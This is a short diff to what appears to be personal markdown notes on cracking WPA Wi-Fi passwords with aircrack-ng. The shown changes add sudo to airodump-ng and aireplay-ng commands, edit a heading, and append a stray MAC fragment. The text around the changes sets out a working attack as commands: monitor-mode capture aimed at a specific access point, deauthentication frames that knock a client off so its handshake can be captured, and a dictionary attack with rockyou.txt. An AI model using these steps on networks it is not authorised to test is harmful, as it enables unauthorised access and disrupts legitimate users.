@@ -18,7 +18,7 @@ sudo ip link set wlan0mon up
 iw wlan0mon set channel 7
 ```
 
-### Check for networks with WPA available (normally WPA CCNP)
+### Check for networks with WPA available (normally WPA CCNP PSK)
 ```text
 sudo airodump-ng wlan0mon
 ```
@@ -32,12 +32,12 @@ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probe
 
 ### Monitor/grab packets and wait for the handshake
 ```text
-airodump-ng -c 6 --bssid 30:94:8F:E8:89:5F -w file wlan0mon
+sudo airodump-ng -c 6 --bssid 30:94:8F:E8:89:5F -w file wlan0mon
 ```
 
 ### De-auth for a seprate channel to spead up / bute force the handshake
 ```text
-aireplay-ng -0 1 -a 30:94:8F:E8:89:5F -c E4:84:D3:2E:1F:42 wlan0
+sudo aireplay-ng -0 1 -a 30:94:8F:E8:89:5F -c E4:84:D3:2E:1F:42 wlan0
 ```
 
 ### once handshake has been collected ....
@@ -67,6 +67,8 @@ aircrack-ng out.cap
 locate rockyou.txt
 
 aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
+
+0:27:F5:66:BE:27
 ```
 #### Or a faster way to crack
 
